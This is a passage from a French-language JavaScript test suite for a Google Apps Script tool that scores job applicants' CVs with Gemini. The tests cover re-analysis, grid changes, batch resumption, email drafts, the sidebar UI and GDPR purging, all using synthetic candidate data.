    const entete = feuille.getRange(3, 1, 1, feuille.getLastColumn()).getValues()[0];
    return feuille.lire(lignes(g).find((x) => x['ID fichier'] === id).numero, entete.indexOf(colonne) + 1).encre;
  };
  assert.strictEqual(encre('cv17', 'Recommandation'), '#dc2626', 'une erreur s\'écrit en rouge');
  const avant = evaluationsEnvoyees(g).length;
  // Les deux CV en erreur sont corrigés dans Drive.
  g.fichiers.get('cv16').spec.contenu = cv('cv16', 'Marc Vidal', 'marc@ex.fr', '0616161616', 'SSSS').contenu;
  g.fichiers.get('cv17').spec.contenu = cv('cv17', 'Nina Lopez', 'nina@ex.fr', '0617171717', 'SSSS').contenu;
  f('analyzeCVs')();
  assert.strictEqual(evaluationsEnvoyees(g).length - avant, 2);
  const apres = lignes(g);
  assert.strictEqual(apres.length, 17, 'réécriture sur place, pas de ligne en plus');
  assert.strictEqual(parId(g).cv17.Candidat, 'Nina Lopez');
  assert.ok(apres.every((x) => x.Recommandation !== 'Erreur'));
  assert.strictEqual(encre('cv17', 'Candidat'), '#1e40af', 'corrigée, la ligne ne reste pas rouge');
  f('analyzeCVs')();
  assert.ok(derniereAlerte(g).message.startsWith('Aucun CV à analyser'), derniereAlerte(g).message);
});

test('Réanalyse en échec : la ligne garde le nom et l\'email du candidat, seul son statut passe en erreur', () => {
  const env = installer({ dossier: DOSSIER().slice(0, 3) });
  const { f, g } = env;
  analyserTout(env);
  g.fichiers.get('cv02').spec.contenu = cv('cv02', 'Bruno Petit', 'bruno@ex.fr', '0622222222', 'SSPN', { profil: { http: 500 } }).contenu;
  ecrireGrille(g, [...GRILLE_LIGNES, ['Kubernetes', 'Souhaitable', '', '']]);
  f('analyzeCVs')();
  const bruno = parId(g).cv02;
  assert.strictEqual(bruno.Recommandation, 'Erreur');
  assert.strictEqual(bruno.Candidat, 'Bruno Petit');
  assert.strictEqual(bruno.Email, 'bruno@ex.fr');
  assert.strictEqual(lignes(g).length, 3);
});

test('Menu : construit même quand la langue du compte est illisible (déclencheur simple)', () => {
  const { f, g } = charger({ localeIndisponible: true });
  f('onOpen')();
  assert.strictEqual(g.journal.menus.length, 1);
  assert.strictEqual(g.journal.menus[0].titre, '🚀 Analyseur de CV');
});

test('Grille modifiée : poids → recalcul sans Gemini ; critère ajouté → réanalyse ; retiré → rien', () => {
  // Sans les deux CV en erreur : ceux-là sont retentés à chaque lancement, et c'est voulu.
  const env = installer({ dossier: DOSSIER().slice(0, 15) });
  const { f, g } = env;
  analyserTout(env);
  const appels = () => evaluationsEnvoyees(g).length;
  const n0 = appels();

  // Poids de l'anglais à zéro : cv02 (SSPN) passe de 75 à 86, sans appel.
  ecrireGrille(g, GRILLE_LIGNES.map((l, i) => (i === 3 ? [l[0], l[1], 0, l[3]] : l)));
  f('recalculerClassement')();
  assert.strictEqual(appels(), n0);
  assert.strictEqual(parId(g).cv02['Score / 100'], 86);

  // Critère ajouté : tout le monde est à réanalyser, et le motif le nomme.
  ecrireGrille(g, [...GRILLE_LIGNES, ['Kubernetes', 'Souhaitable', '', '']]);
  f('recalculerClassement')();
  const l = parId(g);
  assert.strictEqual(l.cv02.Recommandation, 'À réanalyser');
  assert.ok(l.cv02['Motif de la recommandation'].includes('Kubernetes'));
  assert.ok(derniereAlerte(g).message.includes('lancez l\'analyse'), derniereAlerte(g).message);

  f('analyzeCVs')();
  assert.strictEqual(appels() - n0, 15, 'chaque CV réanalysé une fois');
  assert.strictEqual(lignes(g).length, 15);
  assert.ok(lignes(g).every((x) => x.Recommandation !== 'À réanalyser'));

  // Critère retiré : rien à refaire.
  ecrireGrille(g, GRILLE_LIGNES);
  const n1 = appels();
  f('analyzeCVs')();
  assert.strictEqual(appels(), n1);
  assert.ok(derniereAlerte(g).message.startsWith('Aucun CV à analyser'));
});

test('Décision RH et colonnes de l\'équipe : jamais écrasées, elles suivent leur candidat au tri', () => {
  const env = installer();
  const { f, g } = env;
  analyserTout(env);
  const feuille = feuilleResultats(g);
  // L'équipe insère une colonne à gauche de « Recommandation » et commente Emma.
  const entete = feuille.getRange(3, 1, 1, feuille.getLastColumn()).getValues()[0];
  const colReco = entete.indexOf('Recommandation') + 1;
  feuille.insererColonneAvant(colReco);
  feuille.getRange(3, colReco).setValues([['Commentaires RH']]);
  const emma = () => lignes(g).find((x) => x['ID fichier'] === 'cv05');
  feuille.getRange(emma().numero, colReco).setValues([['Rappeler lundi']]);
  const colDecision = feuille.getRange(3, 1, 1, feuille.getLastColumn()).getValues()[0].indexOf('Décision RH') + 1;
  feuille.getRange(emma().numero, colDecision).setValues([['À contacter']]);

  // Nouvelle grille → tout est réanalysé et retrié.
  ecrireGrille(g, [...GRILLE_LIGNES, ['Kubernetes', 'Souhaitable', '', '']]);
  f('analyzeCVs')();
  assert.strictEqual(emma()['Commentaires RH'], 'Rappeler lundi');
  assert.strictEqual(emma()['Décision RH'], 'À contacter');
  assert.strictEqual(emma().Recommandation, 'À garder en vivier', 'la proposition de l\'outil ne dépend pas de la décision RH');
});

test('Mise à niveau d\'un classeur v0 : colonnes ajoutées, lignes réanalysées sur place, prompt figé remplacé', () => {
  const { f, g } = charger({ grilleProposee: GRILLE });
  g.proprietes.script.setProperty('GEMINI_API_KEY', 'AIzaCleDeTest0123456789');
  g.ajouterDossier(ID_DOSSIER, DOSSIER().slice(0, 3));
  // Onglet au format v0, avec son prompt figé dans les réglages.
  const feuille = g.classeur.insertSheet("Résultats de l'analyse");
  const anciens = ['Candidat', 'Email', 'Téléphone', 'Expérience pertinente', 'Formation & diplômes', 'Top 3 compétences', 'Points forts', 'Points de vigilance / questions', 'Recommandation', 'Note / 5', 'Fichier CV', "Date d'analyse", 'ID fichier'];
  feuille.getRange(3, 1, 1, 13).setValues([anciens]);
  feuille.getRange(4, 1, 3, 13).setValues(['cv01', 'cv02', 'cv03'].map((id, i) => [`Ancien ${i}`, `${id}@ex.fr`, "'0600000000", '', '', 'Oui (Python)', '', '', 'À contacter', 4, `${id}.pdf`, new Date(), id]));
  g.proprietes.document.setProperties({
    CFG_FOLDER_URL: URL_DOSSIER, CFG_JOB_DESCRIPTION: 'Développeur Python', CFG_SYSTEM_PROMPT: PROMPTS_HISTORIQUES[0].texte, CFG_ACCOUNT_TYPE: 'Payant (Pay-as-you-go)',
  });
  f('proposerGrilleEvaluation')();
  f('analyzeCVs')();

  const confirmation = g.journal.alertes.find((a) => a.titre === 'Confirmation');
  assert.ok(confirmation.message.includes('3 à réanalyser'), confirmation.message);
  const toutes = lignes(g);
  assert.strictEqual(toutes.length, 3, 'réanalyse sur place');
  assert.ok(toutes.every((x) => typeof x['Score / 100'] === 'number'));
  // Défaut v1.0.0 : « Note / 5 » (ancien modèle) restait affichée à côté du score — « 4/5 » et « 42/100 ».
  const entete = feuille.getRange(3, 1, 1, feuille.getLastColumn()).getValues()[0];
  assert.ok(!entete.some((nom) => /Note \/ 5|Top 3 compétences/.test(nom)), `colonnes de l'ancien modèle encore là : ${entete}`);
  // Les colonnes gardées n'ont pas glissé sous leurs valeurs.
  const cv01 = toutes.find((x) => x['ID fichier'] === 'cv01');
  assert.strictEqual(cv01.Candidat, 'Alice Martin');
  assert.strictEqual(cv01['Fichier CV'], 'cv01.pdf');
  assert.strictEqual(g.journal.colonnesSupprimees, 2);
  const prompt = evaluationsEnvoyees(g)[0].textes[0];
  assert.ok(prompt.includes('Évalue chaque critère de la grille séparément'), 'le nouveau prompt par défaut doit remplacer le prompt figé');
  assert.ok(!prompt.includes('aucune interprétation'));
});

test('Reprise automatique : compte gratuit, lots de 3, arrêt avant 6 minutes puis reprise sans doublon', () => {
  const dossier = Array.from({ length: 20 }, (_, i) => cv(`r${String(i).padStart(2, '0')}`, `Personne Numero${i}`, `p${i}@ex.fr`, `07000000${String(i).padStart(2, '0')}`, i % 2 ? 'SSSS' : 'SSNN'));
  const env = installer({ dossier, compte: 'Gratuit (Free tier)', msParAppelGemini: 20000 });
  const { f, g } = env;
  f('analyzeCVs')();
  const etat = () => JSON.parse(g.proprietes.script.getProperty('CV_ANALYZER_JOB_STATE'));
  assert.strictEqual(etat().status, 'CONTINUING');
  assert.ok(g.declencheurs.some((d) => d.getHandlerFunction() === '_resumeAnalysisTrigger' && d.d.ms === 60000));
  let tours = 0;
  while (etat().status === 'CONTINUING' && tours < 20) {
    g.avancer(60000);
    f('_resumeAnalysisTrigger')();
    tours++;
  }
  assert.strictEqual(etat().status, 'COMPLETED');
  const toutes = lignes(g);
  assert.strictEqual(toutes.length, 20);
  assert.strictEqual(new Set(toutes.map((x) => x['ID fichier'])).size, 20);
  assert.strictEqual(evaluationsEnvoyees(g).length, 20, 'aucun CV analysé deux fois');
  assert.ok(!g.declencheurs.some((d) => d.getHandlerFunction() === '_resumeAnalysisTrigger'), 'déclencheurs de reprise ramassés');
  assert.strictEqual(toutes.filter((x) => x.Recommandation === 'À contacter').length, 3);
});


/* =============================== Modèles =============================== */

const MODELES_GOOGLE = [
  { name: 'models/gemini-2.5-flash', supportedGenerationMethods: ['generateContent'] },
  { name: 'models/gemini-4.0-flash', supportedGenerationMethods: ['generateContent', 'countTokens'] },
  { name: 'models/gemini-4.0-flash-lite', supportedGenerationMethods: ['generateContent'] },
  { name: 'models/gemini-4.1-flash-preview', supportedGenerationMethods: ['generateContent'] },
  { name: 'models/gemini-4.0-pro', supportedGenerationMethods: ['generateContent'] },
  { name: 'models/gemini-embedding-001', supportedGenerationMethods: ['embedContent'] },
  { name: 'models/gemini-4.0-flash-image', supportedGenerationMethods: ['generateContent'] },
  { name: 'models/text-bison-001', supportedGenerationMethods: ['generateText'] },
];

test('Modèles : liste lue chez Google, paginée, filtrée, triée ; défaut = flash stable le plus récent ; cache', () => {
  const { f, g } = charger({ modelesGoogle: MODELES_GOOGLE });
  g.proprietes.script.setProperty('GEMINI_API_KEY', 'AIzaCleDeTest0123456789');
  const r = f('modelesDisponibles_')();
  assert.strictEqual(r.source, 'google');
  assert.deepStrictEqual([...r.modeles], ['gemini-4.1-flash-preview', 'gemini-4.0-flash', 'gemini-4.0-flash-lite', 'gemini-4.0-pro', 'gemini-2.5-flash']);
  assert.strictEqual(r.defaut, 'gemini-4.0-flash', 'ni préversion ni lite');
  f('modelesDisponibles_')();
  assert.strictEqual(g.journal.listesModeles, 3, 'trois pages lues une seule fois, puis le cache');
});

test('Modèles : Google injoignable ou clé absente → liste de secours, et le panneau le dit', () => {
  const { f, g } = charger({ listeModelesEnPanne: true });
  assert.strictEqual(f('modelesDisponibles_')().erreur, 'clé API non configurée');
  g.proprietes.script.setProperty('GEMINI_API_KEY', 'AIzaCleDeTest0123456789');
  const r = f('modelesDisponibles_')();
  assert.strictEqual(r.source, 'secours');
  assert.ok(r.erreur.includes('503'), r.erreur);
  assert.ok(r.modeles.length > 0);
});

test('Modèles : un modèle enregistré qui a disparu reste choisi, signalé, jamais remplacé en silence', () => {
  const env = installer({ modelesGoogle: MODELES_GOOGLE, dossier: DOSSIER().slice(0, 2) });
  const { el } = panneau(env);
  // installer() enregistre gemini-3.7-flash, absent de la liste de Google.
  assert.strictEqual(el('modelSelect').enfants.find((o) => o.selected).value, 'gemini-3.7-flash');
  assert.ok(el('modelSelect').enfants[0].textContent.includes("n'est plus proposé par Google"));
  assert.strictEqual(el('modelSourceHint').className, 'hint warn');
  assert.strictEqual(env.f('getConfig')().model, 'gemini-3.7-flash', 'le réglage enregistré ne bouge pas');
});

test('Modèles : un classeur neuf reçoit le flash stable le plus récent de Google', () => {
  const { f, g } = charger({ modelesGoogle: MODELES_GOOGLE });
  g.proprietes.script.setProperty('GEMINI_API_KEY', 'AIzaCleDeTest0123456789');
  const donnees = f('getSidebarInitialData')();
  assert.strictEqual(donnees.modeles.choisi, 'gemini-4.0-flash');
  assert.strictEqual(donnees.config.model, 'gemini-4.0-flash');
  assert.strictEqual(donnees.modeles.retire, false);
});

test('Défaut v1.0.0 : modèle retiré → l\'analyse s\'arrête au premier lot avec un message utile, sans une erreur par CV', () => {
  const env = installer({ modelesRetires: ['gemini-3.7-flash'], grille: false });
  const { f, g } = env;
  ecrireGrille(g, GRILLE_LIGNES);
  assert.throws(() => f('analyzeCVs')(), /n'est pas disponible chez Google/);
  const etat = JSON.parse(g.proprietes.script.getProperty('CV_ANALYZER_JOB_STATE'));
  assert.strictEqual(etat.status, 'ERROR');
  assert.ok(etat.errorMessage.includes('Choisissez-en un autre dans le panneau'), etat.errorMessage);
  assert.strictEqual(lignes(g).length, 0, 'aucune ligne d\'erreur par CV');
  g.verrou.tenu = false;
  f('proposerGrilleEvaluation')();
  assert.ok(derniereAlerte(g).message.includes("n'est pas disponible chez Google"), derniereAlerte(g).message);
});

/* =============================== Brouillons =============================== */

test('Brouillons : décision RH prioritaire, un par adresse, datés, jamais refaits', () => {
  const env = installer();
  const { f, g } = env;
  analyserTout(env);
  const feuille = feuilleResultats(g);
  const entete = feuille.getRange(3, 1, 1, feuille.getLastColumn()).getValues()[0];
  const colDecision = entete.indexOf('Décision RH') + 1;
  const numero = (id) => lignes(g).find((x) => x['ID fichier'] === id).numero;
  feuille.getRange(numero('cv05'), colDecision).setValues([['à contacter']]); // saisie libre de casse
  feuille.getRange(numero('cv02'), colDecision).setValues([['Entretien le 12/10']]);
  // Le cabinet a envoyé deux CV sous sa propre adresse : une invitation et un refus partiraient au même endroit.
  feuille.getRange(numero('cv12'), colDecision).setValues([['À refuser']]);

  f('draftEmailsForCandidates')();
  const confirmation = g.journal.alertes.find((a) => a.titre === "Génération d'emails via l'IA");
  assert.ok(confirmation.message.includes('Écartés'), confirmation.message);
  const adresses = g.journal.brouillons.map((b) => b.destinataire);
  assert.strictEqual(new Set(adresses).size, adresses.length, 'un seul brouillon par adresse');
  assert.ok(adresses.includes('emma@ex.fr'), 'la décision RH prime sur le vivier de l\'outil');
  assert.ok(!adresses.includes('bruno@ex.fr'), 'une décision libre veut dire « l\'équipe s\'en occupe »');
  assert.strictEqual(adresses.filter((a) => a === 'alice@ex.fr').length, 1, 'le doublon d\'Alice ne reçoit rien de plus');
  assert.strictEqual(adresses.filter((a) => a === 'cabinet@agence.fr').length, 1, 'une adresse partagée ne reçoit qu\'un brouillon');
  assert.ok(confirmation.message.includes("l'adresse d'un candidat déjà servi"), confirmation.message);
  const emma = g.journal.brouillons.find((b) => b.destinataire === 'emma@ex.fr');
  assert.ok(emma.sujet.includes('Échange téléphonique'));
  const dates = lignes(g).filter((x) => x['Brouillon créé le'] !== '');
  assert.strictEqual(dates.length, adresses.length, 'chaque brouillon est daté sur sa ligne');

  const avant = g.journal.brouillons.length;
  f('draftEmailsForCandidates')();
  assert.strictEqual(g.journal.brouillons.length, avant, 'une relance ne recrée rien');
  assert.ok(derniereAlerte(g).message.startsWith('Aucun brouillon à créer'), derniereAlerte(g).message);
});

test('Brouillons : budget de temps atteint, relance qui termine sans doublon', () => {
  const env = installer({ msParAppelGemini: 70000 });
  const { f, g } = env;
  analyserTout(env);
  f('draftEmailsForCandidates')();
  assert.ok(derniereAlerte(g).message.includes('Temps limite atteint'), derniereAlerte(g).message);
  const premiers = g.journal.brouillons.length;
  assert.ok(premiers > 0);
  f('draftEmailsForCandidates')();
  const adresses = g.journal.brouillons.map((b) => b.destinataire);
  assert.ok(adresses.length > premiers);
  assert.strictEqual(new Set(adresses).size, adresses.length, 'aucun brouillon en double après reprise');
});

/* =============================== Panneau =============================== */

test('Panneau : candidats désignés par leur fichier, même après un tri', () => {
  const env = installer();
  const { f, g } = env;
  analyserTout(env);
  const donnees = f('getSidebarInitialData')();
  assert.strictEqual(donnees.version, fs.readFileSync(path.join(RACINE, 'VERSION'), 'utf8').trim());
  assert.strictEqual(donnees.grille.nombre, 4);
  assert.ok(donnees.candidatesList.every((c) => c.fileId));
  const cible = donnees.candidatesList.find((c) => c.fileId === 'cv05');
  // Un reclassement déplace les lignes entre le chargement du panneau et le clic.
  ecrireGrille(g, GRILLE_LIGNES.map((l, i) => (i === 2 ? [l[0], 'Souhaitable', 1, l[3]] : l)));
  f('recalculerClassement')();
  const r = f('draftSingleCandidateEmail')(cible.fileId);
  assert.ok(r.ok, r.message);
  assert.strictEqual(g.journal.brouillons[g.journal.brouillons.length - 1].destinataire, 'emma@ex.fr');
  const deuxieme = f('draftSingleCandidateEmail')(cible.fileId);
  assert.ok(!deuxieme.ok && deuxieme.message.includes('déjà été créé'));
  const fiche = f('getCandidateDetails')('cv05');
  assert.ok(fiche.detail.includes('Calcul'));
  assert.ok(fiche.brouillon !== '');
  // Ligne active sur un autre onglet : pas de candidat « sélectionné » par erreur.
  g.selectionner(feuilleGrille(g), 5);
  assert.strictEqual(f('getSelectedCandidateDetails')(), null);
});

/**
 * Exécute le script du panneau contre un DOM minimal ; ses appels à
 * `google.script.run` sont servis par les vraies fonctions serveur du banc,
 * après un aller-retour JSON — et refusés s'ils rendent une Date, que le vrai
 * pont ne sait pas transmettre.
 */
const panneau = (env) => {
  const html = fs.readFileSync(path.join(RACINE, 'Sidebar.html'), 'utf8');
  const ids = new Set([...html.matchAll(/id="([^"]+)"/g)].map((m) => m[1]));
  const script = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map((m) => m[1]).join('\n');
  const elements = new Map();
  const element = (nom) => ({
    nom, textContent: '', innerHTML: '', className: '', value: '', disabled: false, href: '', style: {}, enfants: [],
    appendChild(e) { this.enfants.push(e); },
    getAttribute: () => '',
    classList: { add() {}, remove() {} },
  });
  const document = {
    getElementById: (id) => {
      if (!ids.has(id)) throw new Error(`#${id} absent du HTML`);
      if (!elements.has(id)) elements.set(id, element(id));
      return elements.get(id);
    },
    querySelectorAll: () => [],
    createElement: (balise) => element(balise),
  };
  const appels = [];
  const contient = (v, trouve = (x) => Object.prototype.toString.call(x) === '[object Date]') => trouve(v)
    || (v && typeof v === 'object' && Object.values(v).some((x) => contient(x, trouve)));
  const pont = () => {
    const chaine = { ok: null, ko: null };
    const proxy = new Proxy(chaine, {
      get: (c, nom) => {
        if (nom === 'withSuccessHandler') return (fn) => { c.ok = fn; return proxy; };
        if (nom === 'withFailureHandler') return (fn) => { c.ko = fn; return proxy; };
        return (...args) => {
          appels.push(nom);
          const cible = env.f(nom);
          if (typeof cible !== 'function') throw new Error(`google.script.run.${nom} : fonction serveur absente`);
          const resultat = cible(...JSON.parse(JSON.stringify(args)));
          if (contient(resultat)) throw new Error(`${nom} rend une Date : le vrai pont renverrait une erreur`);
          if (c.ok) c.ok(resultat === undefined ? undefined : JSON.parse(JSON.stringify(resultat)));
        };
      },
    });
    return proxy;
  };
  const auChargement = [];
  const minuteries = [];
  const confirmations = [];
  const reponseConfirmation = { valeur: false };
  const client = {
    document,
    window: {
      addEventListener: (ev, fn) => { if (ev === 'DOMContentLoaded') auChargement.push(fn); },
      confirm: (message) => { confirmations.push(message); return reponseConfirmation.valeur; },
    },
    google: { script: { run: new Proxy({}, { get: (c, nom) => pont()[nom] }) } },
    setTimeout: (fn) => { minuteries.push(fn); return minuteries.length; },
    clearTimeout: () => {},
    setInterval: () => 0,
    clearInterval: () => {},
    console,
  };
  vm.createContext(client);
  vm.runInContext(script, client, { filename: 'Sidebar.html' });
  auChargement.forEach((fn) => fn());
  const ecoulerMinuteries = () => minuteries.splice(0).forEach((fn) => fn());
  return { client, el: (id) => document.getElementById(id), appels, ecoulerMinuteries, confirmations, reponseConfirmation, appeler: (nom, ...args) => vm.runInContext(nom, client)(...args) };
};

test('Panneau : le script client s\'exécute sur les données réelles du serveur', () => {
  const env = installer();
  analyserTout(env);
  const { el, appels, appeler, ecoulerMinuteries, confirmations, reponseConfirmation } = panneau(env);
  assert.ok(appels.includes('getSidebarInitialData'));
  const version = fs.readFileSync(path.join(RACINE, 'VERSION'), 'utf8').trim();
  assert.ok(el('appFooter').textContent.startsWith(`Version ${version}`), el('appFooter').textContent);
  assert.ok(el('gridSummary').textContent.startsWith('4 critères dont 1 indispensable'), el('gridSummary').textContent);
  assert.strictEqual(el('placesContactInput').value, 3);
  assert.strictEqual(el('systemPromptInput').value, '', 'le prompt par défaut n\'est plus recopié dans le champ');
  assert.ok(el('candidatePicker').enfants.length >= 15);
  assert.ok(/\/100$/.test(el('cardScore').textContent), el('cardScore').textContent);

  appeler('loadCandidateDetails', 'cv07');
  assert.strictEqual(el('cardBadgeReco').textContent, 'Doublon');
  assert.strictEqual(el('cardBadgeReco').className, 'badge duplicate');
  // Ligne « Doublon » : le motif le dit, la section ne le répète pas.
  assert.ok(el('cardMotif').textContent.startsWith('Même personne que Alice Martin (cv01.pdf), même email'), el('cardMotif').textContent);
  assert.strictEqual(el('cardDoublonSection').style.display, 'none');
  appeler('loadCandidateDetails', 'cv01');
  assert.strictEqual(el('cardDoublonSection').style.display, 'block', 'la fiche retenue montre ses autres CV');
  assert.ok(el('cardDetail').textContent.includes('Calcul'));

  appeler('loadCandidateDetails', 'cv05');
  assert.strictEqual(el('cardCandidateName').textContent, 'Emma Roux');
  appeler('draftCandidateEmail');
  assert.strictEqual(env.g.journal.brouillons.pop().destinataire, 'emma@ex.fr');
  assert.ok(el('btnDraftEmail').disabled, 'bouton désactivé une fois le brouillon créé');

  // Défaut v1.0.1 : après un premier message masqué, plus aucun ne s'affichait.
  ecoulerMinuteries();
  // Grille remplie : le panneau dit ce que coûte le remplacement ; refusé, rien ne change.
  const avant = JSON.stringify(env.f('lireGrille_')().criteres.map((c) => c.texte));
  ecrireGrille(env.g, GRILLE_LIGNES.map((l, i) => (i === 0 ? [l[0], l[1], 5, l[3]] : l)));
  reponseConfirmation.valeur = false;
  appeler('proposeGrid');
  assert.ok(confirmations.pop().includes('niveaux, poids et précisions retouchés'), 'le coût du remplacement est dit');
  assert.strictEqual(env.f('lireGrille_')().criteres[0].poids, 5, 'refusé : la grille retouchée reste');
  // Accepté : la grille est remplacée, le message de succès s'affiche.
  reponseConfirmation.valeur = true;
  appeler('proposeGrid');
  assert.strictEqual(env.f('lireGrille_')().criteres[0].poids, 3, 'accepté : la proposition remplace la grille');
  assert.strictEqual(JSON.stringify(env.f('lireGrille_')().criteres.map((c) => c.texte)), avant);
  assert.strictEqual(el('toastMessage').className, 'toast success', 'le message de succès doit être visible');
  assert.notStrictEqual(el('toastMessage').style.display, 'none', 'aucun style en ligne ne doit le masquer');
  appeler('rerank');
  assert.ok(appels.includes('recalculerClassementDepuisPanneau'));
  assert.ok(el('toastMessage').textContent.includes('à contacter'), el('toastMessage').textContent);
  appeler('updateJobDisplay', { status: 'COMPLETED', total: 3, processed: 3, topContactCount: 2, recentCandidates: [{ name: 'X', score: '', reco: 'Erreur' }] });
  assert.strictEqual(el('statTopContactLabel').textContent, 'À contacter (max 3)');

  // Onglet Suivi : la fin d'analyse n'est dite qu'une fois, par le libellé de progression.
  ecoulerMinuteries();
  appeler('switchTab', 'tabProgress');
  appeler('pollProgress');
  assert.strictEqual(el('toastMessage').className, 'toast', 'pas de bandeau qui répète le libellé');
  assert.strictEqual(el('progressStepLabel').textContent, 'Analyse terminée avec succès');
  appeler('switchTab', 'tabConfig');

  // « Programmé » dit depuis quand ; au-delà de 3 minutes, ce qui peut l'expliquer et où regarder.
  appeler('updateJobDisplay', { status: 'SCHEDULED', total: 0, processed: 0, currentFileName: 'Démarrage programmé', lastUpdated: Date.now() - 45000 });
  assert.strictEqual(el('headerStatusPill').textContent, 'Programmé');
  assert.ok(/\(depuis 4[5-6] s\)$/.test(el('progressStepLabel').textContent), el('progressStepLabel').textContent);
  appeler('updateJobDisplay', { status: 'SCHEDULED', total: 0, processed: 0, currentFileName: 'Démarrage programmé', lastUpdated: Date.now() - 250000 });
  assert.strictEqual(el('headerStatusPill').textContent, 'Attente');
  assert.ok(el('progressStepLabel').textContent.includes('Exécutions'), el('progressStepLabel').textContent);
});

test('Panneau : le nom de l\'outil n\'est écrit qu\'une fois, dans la barre de titre de Google', () => {
  const html = fs.readFileSync(path.join(RACINE, 'Sidebar.html'), 'utf8');
  const sansCode = html.replace(/<script[\s\S]*?<\/script>/g, '').replace(/<style[\s\S]*?<\/style>/g, '').replace(/<!--[\s\S]*?-->/g, '');
  const texte = sansCode.replace(/<[^>]+>/g, ' ');
  const script = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map((m) => m[1]).join('\n');
  assert.ok(texte.includes('État de l\'analyse'), 'le contrôle ne lit plus le texte du panneau');
  assert.ok(!/Analyseur de CV/.test(texte), 'nom de l\'outil répété dans le corps du panneau');
  assert.ok(!/`Analyseur de CV/.test(script), 'nom de l\'outil répété par le script du panneau');
  const controleur = fs.readFileSync(path.join(RACINE, 'SidebarController.gs'), 'utf8');
  assert.ok(/setTitle\('🚀 Analyseur de CV'\)/.test(controleur), 'titre de la barre de Google');
});

/* =============================== Démarrage par déclencheur =============================== */

const etatTravail = (g) => JSON.parse(g.proprietes.script.getProperty('CV_ANALYZER_JOB_STATE'));

test('Défaut v1.0.0 : déclencheur arrivé pendant une autre opération → nouvel essai dit, puis démarrage', () => {
  const env = installer({ dossier: DOSSIER().slice(0, 3) });
  const { f, g } = env;
  assert.ok(f('startAnalysisFromSidebar')(null).ok);
  assert.strictEqual(etatTravail(g).status, 'SCHEDULED');
  g.verrou.tenuAilleurs = true; // un recalcul, des brouillons, une proposition de grille…
  f('_resumeAnalysisTrigger')();
  const enAttente = etatTravail(g);
  assert.strictEqual(enAttente.status, 'SCHEDULED');
  assert.ok(enAttente.currentFileName.includes('nouvel essai dans 1 minute'), enAttente.currentFileName);
  assert.ok(enAttente.waitingSince > 0);
  assert.ok(g.declencheurs.some((d) => d.getHandlerFunction() === '_resumeAnalysisTrigger' && d.d.ms === 60000), 'nouvel essai programmé');
  g.verrou.tenuAilleurs = false;
  g.avancer(60000);
  f('_resumeAnalysisTrigger')();
  const fin = etatTravail(g);
  assert.strictEqual(fin.status, 'COMPLETED');
  assert.strictEqual(fin.waitingSince, 0);
  assert.strictEqual(lignes(g).length, 3);
});

test('Verrou occupé plus de 15 minutes : l\'analyse renonce et le dit, sans déclencheur orphelin', () => {
  const env = installer({ dossier: DOSSIER().slice(0, 3) });
  const { f, g } = env;
  f('startAnalysisFromSidebar')(null);
  g.verrou.tenuAilleurs = true;
  f('_resumeAnalysisTrigger')();
  g.avancer(16 * 60 * 1000);
  f('_resumeAnalysisTrigger')();
  const etat = etatTravail(g);
  assert.strictEqual(etat.status, 'ERROR');
  assert.ok(etat.errorMessage.includes('plus de 15 minutes'), etat.errorMessage);
  assert.ok(!g.declencheurs.some((d) => d.getHandlerFunction() === '_resumeAnalysisTrigger'));
});

test('Défaut v1.0.0 : chien de garde impossible à poser → erreur dite, verrou rendu, pas de « Programmé » éternel', () => {
  const env = installer({ dossier: DOSSIER().slice(0, 3) });
  const { f, g } = env;
  f('startAnalysisFromSidebar')(null);
  g.pannes.creationDeclencheur = 1;
  assert.throws(() => f('_resumeAnalysisTrigger')(), /ScriptApp/);
  const etat = etatTravail(g);
  assert.strictEqual(etat.status, 'ERROR');
  assert.ok(etat.errorMessage.includes('ScriptApp'), etat.errorMessage);
  assert.strictEqual(g.verrou.tenu, false, 'le verrou est rendu');
});

/* =============================== RGPD =============================== */

test('RGPD : CV expirés à la corbeille, lignes pseudonymisées extraits compris, archivées au classement', () => {
  const ancien = Date.now() - (800 * 24 * 3600 * 1000);
  const dossier = DOSSIER().slice(0, 5).map((spec) => (spec.id === 'cv02' ? { ...spec, cree: ancien } : spec));
  const env = installer({ dossier });
  const { f, g } = env;
  analyserTout(env);
  f('purgeOldCVs')();
  assert.ok(g.fichiers.get('cv02').isTrashed());
  const bruno = parId(g).cv02;
  assert.strictEqual(bruno.Candidat, 'Pseudonymisé');
  assert.strictEqual(bruno['Détail du score'], '');
  assert.strictEqual(bruno['Évaluations (données)'], '');
  assert.strictEqual(bruno['Fichier CV'], 'Document purgé');
  assert.ok(g.classeur.getSheetByName('Journal RGPD'));
  const recoAvant = bruno.Recommandation;
  f('recalculerClassement')();
  assert.strictEqual(parId(g).cv02.Recommandation, recoAvant, 'une ligne archivée garde sa recommandation');
  const toutes = lignes(g);
  assert.strictEqual(toutes[toutes.length - 1]['ID fichier'], 'cv02', 'les archives vont en bas');
});

test('RGPD : pas de nettoyage pendant une autre opération sur l\'onglet', () => {
  const ancien = Date.now() - (800 * 24 * 3600 * 1000);
  const dossier = DOSSIER().slice(0, 3).map((spec) => (spec.id === 'cv02' ? { ...spec, cree: ancien } : spec));
  const env = installer({ dossier });
  const { f, g } = env;
  analyserTout(env);
  g.verrou.tenuAilleurs = true;
  f('purgeOldCVs')();
  assert.ok(derniereAlerte(g).message.includes('Relancez le nettoyage RGPD'), derniereAlerte(g).message);
  assert.ok(!g.fichiers.get('cv02').isTrashed());
  assert.strictEqual(parId(g).cv02.Candidat, 'Bruno Petit');
});

/* =============================== Contrôles statiques =============================== */

const sourcesGs = () => FICHIERS_GS.map((nom) => fs.readFileSync(path.join(RACINE, nom), 'utf8')).join('\n');
const sansCommentaires = (code) => code.replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:'"`])\/\/.*$/gm, '$1');

test('Contrôle : aucune constante ou fonction globale déclarée deux fois', () => {
  const noms = [...sourcesGs().matchAll(/^(?:const|function)\s+([A-Za-z_$][\w$]*)/gm)].map((m) => m[1]);
  assert.ok(noms.length > 50, 'le contrôle ne voit plus les déclarations');
  const doublons = noms.filter((n, i) => noms.indexOf(n) !== i);
  assert.deepStrictEqual(doublons, []);
});

test('Contrôle : les cibles de google.script.run existent et ne finissent pas par « _ »', () => {
  const html = [fs.readFileSync(path.join(RACINE, 'Sidebar.html'), 'utf8'), fs.readFileSync(path.join(RACINE, 'UI.gs'), 'utf8')].join('\n');
  // Petit analyseur : après « google.script.run », on saute les
  // .withSuccessHandler(…) — corps de fonction compris, chaînes comprises —
